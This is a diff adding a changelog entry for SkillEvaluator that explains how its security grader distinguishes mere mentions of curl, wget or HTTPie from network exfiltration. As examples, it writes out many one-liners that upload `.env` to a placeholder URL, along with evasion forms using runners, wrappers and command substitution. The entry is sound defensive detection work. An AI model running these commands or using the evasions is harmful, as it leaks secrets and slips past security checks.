@@ -611,6 +611,52 @@ All notable changes to SkillEvaluator are documented in this file.
   `SKILLSPECTOR_PROVIDER=nv_build` gets the same mapping. The key still reaches
   SkillSpector only as `OPENAI_API_KEY`, with `OPENAI_BASE_URL` set to the
   public Build endpoint.
+- Tier 3 security grading no longer reports a network-exfiltration warning,
+  which lowered the Security score to 0.5, when a command only names `curl`,
+  `wget`, or HTTPie as data: `apt-get install -y curl`, `which curl`,
+  `grep -rn http src/`, `env | grep -i http`, or a client mentioned in a shell
+  comment or here-document prose. Every client named after another command is
+  now checked with its own upload rules, as for a direct invocation, so
+  `find . -exec curl -d @{} URL \;`, `poetry run curl -T .env URL`, and
+  `find . -name wget -exec curl -d @.env URL \;` still warn, while a plain
+  request through a command that is not a runner, such as `strace -f curl URL`
+  or `find . -exec curl URL \;`, is now scored like a direct `curl URL`. A
+  mention followed by an HTTP method, an upload flag, or a `key=value` word,
+  such as `http POST` in prose, still warns.
+  A fixed set of runners that start a command in another host, container, root,
+  user, or network namespace, such as `ssh`, `docker`, `docker-compose`,
+  `kubectl`, `apptainer`, `chroot`, `systemd-nspawn`, `bwrap`, or
+  `ip netns exec`, warns on any client named after it, even one named only as
+  data, as in `docker exec app apt-get install -y curl`. That holds when the
+  runner is the command itself, including after a compound keyword, function
+  header, `case` pattern, or `coproc`, also when glued to it
+  (`while true; do ssh host curl URL; done`, `if(ssh host curl URL)`,
+  `case x in x)ssh host curl URL;; esac`), when it follows a pass-through
+  wrapper such as `strace`, `ionice`, `flock`, or `watch`, and when a function
+  that wraps it is called. A runner reached through another command, as in
+  `find . -exec ssh host curl URL \;` or
+  `git submodule foreach ssh host curl URL`, and a runner outside the set are
+  checked only with the client's upload rules.
+  Piped or redirected input stays with a text consumer such as `grep`, `awk`,
+  `sed`, or `jq`; any other command, loop, `if`, `{ ...; }` group, or function
+  body may pass it on, so `cat .env | strace -f http URL`, `< .env http URL`,
+  `sudo < .env http URL`, `2>&1 < .env http URL`,
+  `case "$1" in *) < .env http URL;; esac`, and
+  `while read -r l; do http URL; done < .env` still warn. A function that wraps
+  a client, as in `up() { curl "$@"; }; up -d @.env URL` or
+  `up(){ curl "$@"; }; up -d @.env URL`, is checked with that client's rules,
+  and a `$VAR` command word with no known value, in an action that names curl
+  or wget as a word, gets the curl and wget upload rules, as in
+  `for c in curl wget; do $c --post-file=.env -q URL; done`. A substitution any of
+  whose commands names a client or runner, such as `$(which curl)`,
+  `$(env which curl)`, `$(cd /tmp && which curl)`,
+  `$(command -v curl 2>/dev/null)`, `$(readlink -f $(which curl))`, or
+  `$(which ssh)`, and `$CURL` after a plain, `export`, `declare`, `read`, or
+  `printf -v` assignment, resolve to that command; a fallback chain such as
+  `$(command -v wget || command -v curl)` is checked once for each name. A
+  command printed by `$(echo curl -d @.env URL)` or `$(printf ...)` keeps its
+  printed arguments. Both the host checker and the bundled Harbor verifier
+  apply these rules.
 - Tier 3 plain progress output, which `--progress auto` selects for CI and
   redirected logs, now repeats its `still running` heartbeat every 60 seconds
   instead of every second, so long runs no longer add thousands of identical
